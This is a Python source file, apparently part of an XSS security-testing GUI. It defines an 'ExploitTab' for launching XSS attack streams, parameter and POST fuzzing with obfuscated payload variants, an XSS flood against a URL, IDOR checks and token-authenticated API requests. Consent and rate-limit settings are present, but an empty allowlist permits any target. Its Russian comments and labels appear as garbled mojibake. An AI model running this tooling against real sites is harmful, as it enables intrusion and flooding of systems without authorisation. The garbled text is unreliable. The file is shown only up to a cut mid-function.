# xss_security_gui/exploit_tab.py

from __future__ import annotations

import ast
import csv
import datetime
import json
import os
import threading
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

import requests
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from tkinter.scrolledtext import ScrolledText

from auto_recon.xss_flooder import start_flood
from xss_security_gui.payloads import PAYLOAD_CATEGORIES, get_random_payload, get_stats
from xss_security_gui.payload_generator import generate_payloads, generate_variants
from xss_security_gui.api_parser import extract_api_data
from xss_security_gui.settings import PAYLOAD_DB_PATH
from xss_security_gui.xss_attacker import XSSAttacker
from xss_security_gui.honeypot_monitor import start_honeypot
from xss_security_gui.config_manager import CONFIG
from xss_security_gui.utils.core_utils import normalize_url
from xss_security_gui.utils.network import create_retry_session, TokenBucket
from xss_security_gui.xss_detector import XSSDetector
from xss_security_gui.utils.threat_sender import ThreatSenderMixin


# === –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ ===

@dataclass
class SafetyConfig:
    tester_id: str = "SecurityTest/1.0 (contact: set-me)"
    allowlist: List[str] = field(default_factory=list)
    max_rps: float = 1.0
    max_concurrency: int = 2
    max_run_minutes: float = 30.0
    error_stop_ratio: float = 0.2
    response_log_cap: int = 5000
    require_consent: bool = True
    proxies: Dict[str, str] = field(default_factory=dict)


class ExploitTab(ttk.Frame, ThreatSenderMixin):
    """
    ExploitTab 4.0 ‚Äî –≤–∫–ª–∞–¥–∫–∞ –¥–ª—è –∞–∫—Ç–∏–≤–Ω—ã—Ö –∞—Ç–∞–∫ / PoC:
    - API‚Äë—Ç–µ—Å—Ç—ã
    - XSS‚Äë–∞—Ç–∞–∫–∏ (–ø–æ—Ç–æ–∫, fuzz, flood)
    - IDOR‚Äë–ø—Ä–æ–≤–µ—Ä–∫–∏
    - Honeypot‚Äë–º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥
    - –ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Å ThreatConnector —á–µ—Ä–µ–∑ ThreatSenderMixin
    """

    def __init__(self, parent, threat_tab=None):
        super().__init__(parent)
        self.threat_tab = threat_tab

        self.success_count: int = 0
        self.api_list: List[str] = []
        self.token_list: List[str] = []
        self.all_payloads: List[str] = []
        self.attacker: Optional[XSSAttacker] = None
        self.xss_results: List[Dict[str, Any]] = []
        self.idor_results: List[Dict[str, Any]] = []
        self._iid_map: Dict[str, Dict[str, Any]] = {}
        self._recent: List[Dict[str, Any]] = []
        self._start_ts: float = time.time()

        self.safety = SafetyConfig()
        self._bucket = TokenBucket(self.safety.max_rps)
        self._sem = threading.Semaphore(self.safety.max_concurrency)
        self._req_idx_lock = threading.Lock()

        self._session = create_retry_session()
        self._stop_xss = threading.Event()

        self.build_ui()
        self.load_config()
        self.bind_hotkeys()

    # ==========================
    #   –ö–æ–Ω—Ñ–∏–≥ / —Ö–æ—Ç–∫–µ–∏
    # ==========================

    def load_config(self, path: Optional[str] = None) -> None:
        cfg_path = path or CONFIG.get("exploit_config_path", "config.json")
        try:
            if os.path.exists(cfg_path):
                with open(cfg_path, encoding="utf-8") as f:
                    cfg = json.load(f)

                self.safety.allowlist = cfg.get("allowlist", self.safety.allowlist)
                self.safety.max_rps = float(cfg.get("max_rps", self.safety.max_rps))
                self.safety.max_concurrency = int(cfg.get("max_concurrency", self.safety.max_concurrency))
                self.safety.proxies = cfg.get("proxies", self.safety.proxies)

                self._bucket = TokenBucket(self.safety.max_rps)
                self._sem = threading.Semaphore(self.safety.max_concurrency)

                self.timeout_spin.set(str(cfg.get("timeout", 8)))
                self.rate_spin.set(str(cfg.get("rate_limit", self.safety.max_rps)))
        except Exception as e:
            self._log(f"[config] –æ—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏: {e}", level="warn")

    # ==========================
    #   UI
    # ==========================

    def build_ui(self) -> None:
        # üîê API Tools
        api_frame = ttk.LabelFrame(self, text="üîê API Tools")
        api_frame.pack(fill="x", padx=10, pady=5)

        def row(parent):
            r = ttk.Frame(parent)
            r.pack(fill="x", pady=2)
            return r

        ttk.Label(row(api_frame), text="–ü–æ–ª–Ω—ã–π URL:").pack(side="left", padx=5)
        self.full_url_entry = ttk.Entry(api_frame, width=60)
        self.full_url_entry.pack(padx=5)

        ttk.Label(row(api_frame), text="API Endpoint:").pack(side="left", padx=5)
        self.api_combo = ttk.Combobox(api_frame, values=[], width=60)
        self.api_combo.pack(side="left", padx=5)
        ttk.Button(api_frame, text="üìÇ –í—ã–±—Ä–∞—Ç—å JSON", command=self.select_json_file).pack(side="left", padx=5)

        ttk.Label(row(api_frame), text="Auth Token:").pack(side="left", padx=5)
        self.token_combo = ttk.Combobox(api_frame, values=[], width=60)
        self.token_combo.pack(side="left", padx=5)

        method_row = row(api_frame)
        ttk.Label(method_row, text="–ú–µ—Ç–æ–¥:").pack(side="left", padx=5)
        self.method_combo = ttk.Combobox(method_row, values=["GET", "POST"], state="readonly", width=10)
        self.method_combo.pack(side="left", padx=5)
        self.method_combo.current(0)
        ttk.Button(method_row, text="üîÑ –û–±–Ω–æ–≤–∏—Ç—å —Å–ø–∏—Å–æ–∫", command=self.load_scan_results).pack(side="left", padx=5)

        # JSON Payload
        ttk.Label(self, text="JSON Payload (POST):").pack(anchor="w", padx=10)
        self.payload_box = tk.Text(self, height=6, bg="#1e1e1e", fg="lime", insertbackground="lime")
        self.payload_box.pack(fill="x", padx=10, pady=(0, 10))

        # üì° –ü–∞–Ω–µ–ª—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è
        control_frame = ttk.LabelFrame(self, text="üì° –ü–∞–Ω–µ–ª—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è")
        control_frame.pack(fill="x", padx=10, pady=10)

        ttk.Button(control_frame, text="üì§ –û—Ç–ø—Ä–∞–≤–∏—Ç—å API-–∑–∞–ø—Ä–æ—Å", command=self.send_api_request).pack(pady=4)
        ttk.Button(control_frame, text="üß™ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å XSS-–ø–µ–π–ª–æ–∞–¥—ã", command=self.test_xss_payloads).pack(pady=4)

        xss_control_row = ttk.Frame(control_frame)
        xss_control_row.pack(pady=5)
        ttk.Button(
            xss_control_row,
            text="üöÄ –ó–∞–ø—É—Å—Ç–∏—Ç—å XSS-–ø–æ—Ç–æ–∫",
            command=self.start_xss_attack
        ).pack(side="left", padx=5)
        ttk.Button(
            xss_control_row,
            text="üõë –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å XSS-–ø–æ—Ç–æ–∫",
            command=self.stop_xss_attack
        ).pack(side="left", padx=5)
        ttk.Button(
            xss_control_row,
            text="üß™ XSS Fuzz –ø–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º",
            command=self.run_xss_fuzzing
        ).pack(side="left", padx=5)
        ttk.Button(
            xss_control_row,
            text="üí£ XSS Flood –ø–æ URL",
            command=self.launch_flood
        ).pack(side="left", padx=5)

        # –ò–Ω—Ç–µ—Ä–≤–∞–ª / Timeout / RPS
        interval_row = ttk.Frame(control_frame)
        interval_row.pack(pady=5)

        ttk.Label(interval_row, text="‚è± –ò–Ω—Ç–µ—Ä–≤–∞–ª –º–µ–∂–¥—É –∞—Ç–∞–∫–∞–º–∏ (—Å–µ–∫):").pack(side="left", padx=5)
        self.interval_entry = ttk.Entry(interval_row, width=10)
        self.interval_entry.insert(0, "1")
        self.interval_entry.pack(side="left", padx=5)

        ttk.Label(interval_row, text="‚è± Timeout:").pack(side="left", padx=5)
        self.timeout_spin = ttk.Spinbox(interval_row, from_=1, to=60, width=5)
        self.timeout_spin.set("8")
        self.timeout_spin.pack(side="left", padx=5)

        ttk.Label(interval_row, text="‚ö° RPS:").pack(side="left", padx=5)
        self.rate_spin = ttk.Spinbox(interval_row, from_=0, to=10, increment=0.1, width=5)
        self.rate_spin.set("1.0")
        self.rate_spin.pack(side="left", padx=5)

        # üìã –õ–æ–≥ —Å–æ–±—ã—Ç–∏–π
        ttk.Label(self, text="üìã –õ–æ–≥ —Å–æ–±—ã—Ç–∏–π:").pack(anchor="w", padx=10)
        self.log_box = ScrolledText(self, height=10, bg="#1e1e1e", fg="white", wrap="word")
        self.log_box.pack(fill="both", expand=True, padx=10, pady=5)

        # üì§ –û—Ç–≤–µ—Ç —Å–µ—Ä–≤–µ—Ä–∞
        ttk.Label(self, text="üì§ –û—Ç–≤–µ—Ç —Å–µ—Ä–≤–µ—Ä–∞:").pack(anchor="w", padx=10)
        self.response_box = ScrolledText(self, height=12, bg="#1e1e1e", fg="white", wrap="word")
        self.response_box.pack(fill="both", expand=True, padx=10, pady=5)

        # ===== XSS –†–µ–∑—É–ª—å—Ç–∞—Ç—ã =====
        xss_frame = ttk.LabelFrame(self, text="üöÄ XSS –†–µ–∑—É–ª—å—Ç–∞—Ç—ã")
        xss_frame.pack(fill="both", padx=10, pady=5, expand=True)
        xss_table_frame = ttk.Frame(xss_frame)
        xss_table_frame.pack(fill="both", expand=True, padx=5, pady=5)
        xss_scrollbar = ttk.Scrollbar(xss_table_frame, orient="vertical")
        xss_scrollbar.pack(side="right", fill="y")

        self.xss_tree = ttk.Treeview(
            xss_table_frame,
            columns=("URL", "Status", "Reflected", "Length"),
            show="headings",
            height=10,
            yscrollcommand=xss_scrollbar.set
        )
        self.xss_tree.heading("URL", text="URL")
        self.xss_tree.heading("Status", text="Status")
        self.xss_tree.heading("Reflected", text="Reflected")
        self.xss_tree.heading("Length", text="Length")
        self.xss_tree.column("URL", width=400)
        self.xss_tree.column("Status", width=60, anchor="center")
        self.xss_tree.column("Reflected", width=80, anchor="center")
        self.xss_tree.column("Length", width=80, anchor="center")
        self.xss_tree.pack(fill="both", expand=True)
        xss_scrollbar.config(command=self.xss_tree.yview)
        self.xss_tree.tag_configure("reflected", background="#ffdddd")
        self.xss_tree.tag_configure("clean", background="#ddffdd")
        self.xss_tree.tag_configure("error", background="#eeeeee")

        ttk.Button(control_frame, text="üöÄ –ó–∞–ø—É—Å—Ç–∏—Ç—å –∞—Ç–∞–∫—É", command=self.start_xss_attack).pack(side="left", padx=10)

        # ===== IDOR –ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã =====
        idor_frame = ttk.LabelFrame(self, text="üß™ IDOR Tools")
        idor_frame.pack(fill="x", padx=10, pady=5)
        ttk.Button(idor_frame, text="üß™ –ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å IDOR", command=self.run_idor_test).pack(pady=4)
        ttk.Button(idor_frame, text="üìÑ –≠–∫—Å–ø–æ—Ä—Ç IDOR –≤ CSV", command=self.export_idor_to_csv).pack(pady=4)
        self.status_filter = ttk.Combobox(idor_frame, values=["All", "200", "403", "404", "500"], state="readonly")
        self.status_filter.set("All")
        self.status_filter.pack(pady=4)
        self.status_filter.bind("<<ComboboxSelected>>", self.filter_idor_results)

        self.idor_tree = ttk.Treeview(idor_frame, columns=("URL", "Status", "Sensitive"), show="headings")
        self.idor_tree.heading("URL", text="URL")
        self.idor_tree.heading("Status", text="Status")
        self.idor_tree.heading("Sensitive", text="Sensitive")
        self.idor_tree.pack(fill="both", expand=True, padx=5, pady=5)
        self.idor_tree.tag_configure("sensitive", background="#ffcccc")
        self.idor_tree.tag_configure("normal", background="#ffffff")

        # ===== Payload Generator =====
        gen_frame = ttk.LabelFrame(self, text="üì¶ XSS Payload Generator")
        gen_frame.pack(fill="x", padx=10, pady=5)

        category_frame = ttk.Frame(gen_frame)
        category_frame.pack(fill="x", pady=2)
        ttk.Label(category_frame, text="–ö–∞—Ç–µ–≥–æ—Ä–∏—è:").pack(side="left", padx=10)
        self.category_combo = ttk.Combobox(category_frame, values=PAYLOAD_CATEGORIES, state="readonly", width=30)
        self.category_combo.pack(side="left", padx=10)
        self.category_combo.set(PAYLOAD_CATEGORIES[0])
        self.category_combo.bind("<<ComboboxSelected>>", self.update_payloads)

        search_frame = ttk.Frame(gen_frame)
        search_frame.pack(fill="x", pady=2)
        ttk.Label(search_frame, text="üîç –ü–æ–∏—Å–∫:").pack(side="left", padx=10)
        self.search_entry = ttk.Entry(search_frame, width=40)
        self.search_entry.pack(side="left", padx=10)
        self.search_entry.bind("<KeyRelease>", self.filter_payloads)
        self.search_entry.bind("<Return>", self.insert_filtered_payload)

        self.auto_attack_var = tk.BooleanVar(value=False)
        self.auto_attack_check = ttk.Checkbutton(
            gen_frame,
            text="‚è± –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞–ø—É—Å–∫–∞—Ç—å –∞—Ç–∞–∫—É –ø–æ —Ñ–∏–ª—å—Ç—Ä—É",
            variable=self.auto_attack_var
        )
        self.auto_attack_check.pack(anchor="w", padx=10, pady=5)

        payload_frame = ttk.Frame(gen_frame)
        payload_frame.pack(fill="x", pady=2)
        ttk.Label(payload_frame, text="üéØ –í—ã–±—Ä–∞–Ω–Ω—ã–π Payload:").pack(side="left", padx=10)
        self.payload_combo = ttk.Combobox(payload_frame, values=[], width=80)
        self.payload_combo.pack(side="left", padx=10)

        # üîΩ –ü–æ–ª–µ –≤–≤–æ–¥–∞ –∫–∞—Å—Ç–æ–º–Ω–æ–≥–æ payload'–∞
        entry_frame = ttk.Frame(gen_frame)
        entry_frame.pack(fill="x", pady=2)
        ttk.Label(entry_frame, text="üìù –ù–æ–≤—ã–π Payload:").pack(side="left", padx=10)
        self.custom_payload_entry = ttk.Entry(entry_frame, width=60)
        self.custom_payload_entry.pack(side="left", padx=10)
        ttk.Button(entry_frame, text="üíæ –°–æ—Ö—Ä–∞–Ω–∏—Ç—å", command=self.save_custom_payload).pack(side="left", padx=10)

        # ===== üì¶ –í—Å–µ Payload‚Äô—ã =====
        ttk.Label(self, text="üì¶ –í—Å–µ Payload‚Äô—ã:").pack(anchor="w", padx=10)
        self.payload_text = ScrolledText(self, height=10, bg="#1e1e1e", fg="white", wrap="word")
        self.payload_text.pack(fill="both", expand=True, padx=10, pady=5)

        # ===== üß™ –†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π POST Fuzz =====
        post_fuzz_frame = ttk.LabelFrame(self, text="üß™ –†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π POST Fuzz")
        post_fuzz_frame.pack(fill="x", padx=10, pady=5)
        ttk.Label(post_fuzz_frame, text="–¶–µ–ª–µ–≤–æ–π URL:").pack(side="left", padx=5)
        self.post_fuzz_url_entry = ttk.Entry(post_fuzz_frame, width=60)
        self.post_fuzz_url_entry.pack(side="left", padx=5)
        ttk.Button(post_fuzz_frame, text="üß™ –ó–∞–ø—É—Å—Ç–∏—Ç—å", command=self.run_post_xss_fuzzing).pack(side="left", padx=5)

        # ===== üìä –ö–æ–Ω—Ç–µ–∫—Å—Ç–Ω—ã–µ XSS-—Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã =====
        context_frame = ttk.LabelFrame(self, text="üìä –ö–æ–Ω—Ç–µ–∫—Å—Ç XSS")
        context_frame.pack(fill="both", padx=10, pady=5, expand=True)

        context_table_frame = ttk.Frame(context_frame)
        context_table_frame.pack(fill="both", expand=True, padx=5, pady=5)

        context_scrollbar = ttk.Scrollbar(context_table_frame, orient="vertical")
        context_scrollbar.pack(side="right", fill="y")

        self.xss_context_tree = ttk.Treeview(
            context_table_frame,
            columns=("URL", "Context", "Category", "Suggested Payload"),
            show="headings",
            height=10,
            yscrollcommand=context_scrollbar.set
        )
        for col in ("URL", "Context", "Category", "Suggested Payload"):
            self.xss_context_tree.heading(col, text=col)
            self.xss_context_tree.column(col, width=200 if col != "Suggested Payload" else 300, anchor="w")

        self.xss_context_tree.pack(fill="both", expand=True)
        context_scrollbar.config(command=self.xss_context_tree.yview)
        self.xss_context_tree.tag_configure("reflected", background="#ffdddd")
        self.xss_context_tree.tag_configure("stored", background="#fff6cc")
        self.xss_context_tree.tag_configure("dom", background="#ddeaff")
        self.xss_context_tree.bind("<Double-1>", self.view_full_response)

    def bind_hotkeys(self):
        try:
            self.bind_all("<Control-Return>", lambda e: self.start_xss_attack())
            self.bind_all("<F5>", lambda e: self.load_scan_results())
            self.bind_all("<Escape>", lambda e: self.quit_modal())
        except Exception as e:
            # –õ–æ–≥–∏—Ä—É–µ–º –æ—à–∏–±–∫—É –≤–º–µ—Å—Ç–æ –º–æ–ª—á–∞–ª–∏–≤–æ–≥–æ –∏–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞–Ω–∏—è
            print(f"[‚ö†Ô∏è] –û—à–∏–±–∫–∞ –ø—Ä–∏–≤—è–∑–∫–∏ –≥–æ—Ä—è—á–∏—Ö –∫–ª–∞–≤–∏—à: {e}")

    def quit_modal(self):
        for w in self.winfo_children():
            if isinstance(w, tk.Toplevel):
                w.destroy()

    def _require_consent(self) -> bool:
        if not self.safety.require_consent:
            return True
        return messagebox.askyesno("–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ", "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –∑–∞–ø—É—Å–∫ –∞–∫—Ç–∏–≤–Ω–æ–≥–æ —Ç–µ—Å—Ç–∞?")

    def _is_allowed_target(self, url: str) -> bool:
        if not self.safety.allowlist:
            return True
        return any(str(url).startswith(prefix) for prefix in self.safety.allowlist)

    def get_headers(self) -> dict:
        headers = {"Content-Type": "application/json"}
        token = self.token_combo.get().strip() if hasattr(self, "token_combo") else ""
        if token and token != "‚Äî":
            headers["Authorization"] = f"Bearer {token}"
        return headers

    def get_timeout_rate(self) -> tuple[float, float]:
        try:
            timeout = float(self.timeout_spin.get())
        except Exception:
            timeout = 8.0
        try:
            rate_limit = float(self.rate_spin.get())
        except Exception:
            rate_limit = 0.0
        return timeout, rate_limit

    def _parse_endpoint(self, raw: str) -> dict:
        """
        –ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ URL –∏–∑ —Å—Ç—Ä–æ–∫–∏ –∏–ª–∏ —Å–ª–æ–≤–∞—Ä—è.
        –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —É—Å—Ç—Ä–∞–Ω–µ–Ω–∏—è –¥—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏—è –∫–æ–¥–∞.
        """
        if not raw or raw == "‚Äî":
            raise ValueError("URL –Ω–µ —É–∫–∞–∑–∞–Ω")
        try:
            if raw.startswith("{"):
                endpoint = ast.literal_eval(raw)
            else:
                endpoint = {"url": raw}
            endpoint["url"] = normalize_url(endpoint["url"])
            return endpoint
        except (ValueError, SyntaxError) as e:
            raise ValueError(f"–ù–µ–≤–æ–∑–º–æ–∂–Ω–æ –∏–∑–≤–ª–µ—á—å URL –∏–∑ '{raw}': {e}")

    def get_selected_url(self) -> str:
        """–ò–∑–≤–ª–µ–∫–∞–µ—Ç –∏ –Ω–æ—Ä–º–∞–ª–∏–∑—É–µ—Ç URL –∏–∑ UI."""
        raw = self.api_combo.get().strip() or self.full_url_entry.get().strip()
        endpoint = self._parse_endpoint(raw)
        return endpoint["url"]

    def gui_logger(self, entry: dict):
        if "error" in entry:
            self.log(f"[‚ùå] –û—à–∏–±–∫–∞: {entry['error']} ‚Üí {entry.get('url')}")
            return
        ctx = entry.get("context", "‚ùì")
        cat = entry.get("category", "‚Äî")
        payload = entry.get("payload", entry.get("suggested_payload", "‚Äî"))
        url = entry.get("url", "‚Äî")
        self.log(f"[üí•] {ctx} ‚Üí {url}\n     –ö–∞—Ç–µ–≥–æ—Ä–∏—è: {cat}\n     Payload: {payload}")

    def log(self, text: str):
        ts = datetime.datetime.now().strftime("[%H:%M:%S]")
        msg = f"{ts} {text}\n"

        try:
            if hasattr(self, "log_box") and self.log_box:
                # –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤ –æ—Å–Ω–æ–≤–Ω–æ–π log_box
                self.log_box.insert("end", msg)
                self.log_box.see("end")
            elif hasattr(self, "response_box") and self.response_box:
                # –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤ response_box, –µ—Å–ª–∏ log_box –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç
                self.response_box.insert("end", msg)
                self.response_box.see("end")
            else:
                # –§–æ–ª–±—ç–∫ ‚Äî –≤—ã–≤–æ–¥ –≤ –∫–æ–Ω—Å–æ–ª—å
                print(msg)
        except Exception as e:
            print(f"[‚ö†Ô∏è] –û—à–∏–±–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è: {e}")

    def generate_xss_variants(self, url: str, params: dict | None, method: str):
        """
        –ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç XSS-–≤–∞—Ä–∏–∞–Ω—Ç—ã —á–µ—Ä–µ–∑ XSSDetector.fuzz_xss_parameters.
        –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å–ø–∏—Å–æ–∫ URL (GET) –∏–ª–∏ —Å–ª–æ–≤–∞—Ä–µ–π {"url":..., "json":...} (POST).
        """
        try:
            detector = XSSDetector(threat_tab=self.threat_tab)  # –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Å Threat Intel

            variants = detector.fuzz_xss_parameters(
                base_url=url,  # –∏—Å–ø–æ–ª—å–∑—É–µ–º –∞—Ä–≥—É–º–µ–Ω—Ç –º–µ—Ç–æ–¥–∞
                payload_data=params,  # –∏—Å–ø–æ–ª—å–∑—É–µ–º –∞—Ä–≥—É–º–µ–Ω—Ç –º–µ—Ç–æ–¥–∞
                method=method  # –∏—Å–ø–æ–ª—å–∑—É–µ–º –∞—Ä–≥—É–º–µ–Ω—Ç –º–µ—Ç–æ–¥–∞
            )
            self.log(f"[üß™] –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–æ {len(variants)} XSS-–≤–∞—Ä–∏–∞–Ω—Ç–æ–≤ ({method}).")
            return variants
        except Exception as e:
            self.log(f"[‚ùå] –û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ XSS-–≤–∞—Ä–∏–∞–Ω—Ç–æ–≤: {e}")
            return []

    def view_full_response(self, event):
        """
        –û—Ç–∫—Ä—ã–≤–∞–µ—Ç –æ—Ç–¥–µ–ª—å–Ω–æ–µ –æ–∫–Ω–æ —Å –ø–æ–ª–Ω—ã–º –æ—Ç–≤–µ—Ç–æ–º —Å–µ—Ä–≤–µ—Ä–∞ –¥–ª—è –≤—ã–±—Ä–∞–Ω–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ –≤ xss_context_tree.
        –ò—â–µ—Ç –∑–∞–ø–∏—Å—å –ø–æ —É–Ω–∏–∫–∞–ª—å–Ω–æ–º—É iid; –µ—Å–ª–∏ –Ω–µ—Ç iid ‚Äî –ø—Ä–æ–±—É–µ—Ç —Å–æ–ø–æ—Å—Ç–∞–≤–ª–µ–Ω–∏–µ –ø–æ URL.
        """
        selected = self.xss_context_tree.focus()
        if not selected:
            return

        # –°–Ω–∞—á–∞–ª–∞ –∏—â–µ–º –ø–æ _iid, –∑–∞—Ç–µ–º –ø–æ URL –∏–∑ –≤—ã–±—Ä–∞–Ω–Ω–æ–π —Å—Ç—Ä–æ–∫–∏
        match = next((r for r in self.xss_results if r.get("_iid") == selected), None)
        if not match:
            try:
                values = self.xss_context_tree.item(selected, "values")
                url = values[0] if values and len(values) > 0 else None
                if url:
                    match = next((r for r in self.xss_results if r.get("url") == url and "full_response" in r), None)
            except Exception:
                match = None

        if match and "full_response" in match:
            url = match.get("url", "‚Äî")
            win = tk.Toplevel(self)
            win.title(f"üîç –û—Ç–≤–µ—Ç –æ—Ç {url}")
            win.geometry("1000x700")
            win.configure(bg="#202020")

            # –í–µ—Ä—Ö–Ω—è—è –ø–∞–Ω–µ–ª—å: –∫–Ω–æ–ø–∫–∏ "–°–æ—Ö—Ä–∞–Ω–∏—Ç—å" –∏ "–ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å"
            top = ttk.Frame(win)
            top.pack(fill="x", padx=8, pady=6)
            ttk.Button(top, text="üíæ –°–æ—Ö—Ä–∞–Ω–∏—Ç—å –∫–∞–∫...", command=lambda: self._save_full_response(match["full_response"])) \
                .pack(side="left", padx=4)
            ttk.Button(top, text="üìã –ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å", command=lambda: win.clipboard_append(match["full_response"])) \
                .pack(side="left", padx=4)

            text = ScrolledText(win, wrap="word", bg="#1e1e1e", fg="#eaeaea", insertbackground="#eaeaea")
            text.insert("1.0", match["full_response"])
            text.config(state="disabled")
            text.pack(fill="both", expand=True, padx=8, pady=8)

            # –ó–∞–∫—Ä—ã—Ç–∏–µ –ø–æ Esc
            win.bind("<Escape>", lambda e: win.destroy())
        else:
            messagebox.showinfo("–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö", "–ü–æ–ª–Ω—ã–π –æ—Ç–≤–µ—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω.")

    def _save_full_response(self, content: str):
        try:
            path = filedialog.asksaveasfilename(
                title="–°–æ—Ö—Ä–∞–Ω–∏—Ç—å –ø–æ–ª–Ω—ã–π –æ—Ç–≤–µ—Ç",
                defaultextension=".txt",
                filetypes=[("Text", "*.txt"), ("HTML", "*.html"), ("All", "*.*")]
            )
            if not path:
                return
            os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
            tmp = f"{path}.tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                f.write(content)
            os.replace(tmp, path)
            self.log(f"[üíæ] –û—Ç–≤–µ—Ç —Å–æ—Ö—Ä–∞–Ω—ë–Ω: {path}")
        except Exception as e:
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å —Ñ–∞–π–ª:\n{e}")
            self.log(f"[‚ùå] –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è: {e}")

    # –î–æ–±–∞–≤—å –º–µ—Ç–æ–¥ –≤ ExploitTab
    def run_post_xss_fuzzing(self):
        import copy  # TODO: –ü–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å –≤ –Ω–∞—á–∞–ª–æ —Ñ–∞–π–ª–∞
        if not self._require_consent():
            self.log("[‚ö†Ô∏è] –§—É–∑–∑–∏–Ω–≥ –æ—Ç–º–µ–Ω—ë–Ω: –Ω–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.")
            return

        # === 1. –¶–µ–ª–µ–≤–æ–π URL –∏ allowlist ===
        url = self.post_fuzz_url_entry.get().strip() or (
            self.full_url_entry.get().strip() if hasattr(self, "full_url_entry") else "")
        if not url:
            messagebox.showerror("–û—à–∏–±–∫–∞", "–£–∫–∞–∂–∏ —Ü–µ–ª–µ–≤–æ–π URL.")
            return
        url = normalize_url(url)
        if not self._is_allowed_target(url):
            self.log("[‚ö†Ô∏è] –¶–µ–ª—å –Ω–µ –≤ allowlist. –î–æ–±–∞–≤—å –ø—Ä–µ—Ñ–∏–∫—Å –≤ SafetyConfig.allowlist.")
            return

        # === 2. –ó–∞–≥–æ–ª–æ–≤–∫–∏ –∏ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –æ–∫—Ä—É–∂–µ–Ω–∏—è ===
        headers = self.get_headers()
        timeout, rate_limit = self.get_timeout_rate()

        # –ê–≥—Ä–µ—Å—Å–∏–≤–Ω—ã–µ –∫–æ–Ω—Ç–µ–Ω—Ç-—Ç–∏–ø—ã –∏ –∑–∞–≥–æ–ª–æ–≤–∫–∏
        content_types = [
            "application/json",
            "application/json; charset=utf-8",
            "text/json",
            "application/x-www-form-urlencoded"
        ]
        ua_variants = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) XSSFuzz/1.0",
            "curl/7.79.1 (XSSFuzz)",
            f"SecurityTest/{self.safety.tester_id}"
        ]
        accept_all = ["*/*", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"]

        # === 3. –ò—Å—Ö–æ–¥–Ω—ã–π JSON ===
        try:
            payload_text = self.payload_box.get("1.0", "end").strip()
            base_json = json.loads(payload_text)
        except Exception:
            messagebox.showerror("–û—à–∏–±–∫–∞", "–ù–µ–≤–∞–ª–∏–¥–Ω—ã–π JSON –≤ —Ç–µ–ª–µ –∑–∞–ø—Ä–æ—Å–∞.")
            return

        # === 4. –ü–µ–π–ª–æ–∞–¥—ã ===
        category = self.category_combo.get()
        payloads = generate_payloads().get(category, [])
        if not payloads:
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ—Ç –ø–µ–π–ª–æ–∞–¥–æ–≤ –≤ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ {category}.")
            return

        # === 5. –ú—É—Ç–∞—Ü–∏–∏: —Ä–µ–∫—É—Ä—Å–∏–≤–Ω–∞—è –ø–æ–¥—Å—Ç–∞–Ω–æ–≤–∫–∞ + —É—Å–∏–ª–µ–Ω–Ω—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã ===
        def inject_payloads(base_data, payload):
            mutations = []

            # –£—Å–∏–ª–µ–Ω–Ω—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã (–æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –∏ –ø–æ–ª–∏–º–æ—Ä—Ñ–∏–∑–º)
            variants = [payload] + generate_variants(payload)
            # –ù–µ–±–æ–ª—å—à–æ–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ, —á—Ç–æ–±—ã –Ω–µ –≤–∑–æ—Ä–≤–∞—Ç—å—Å—è
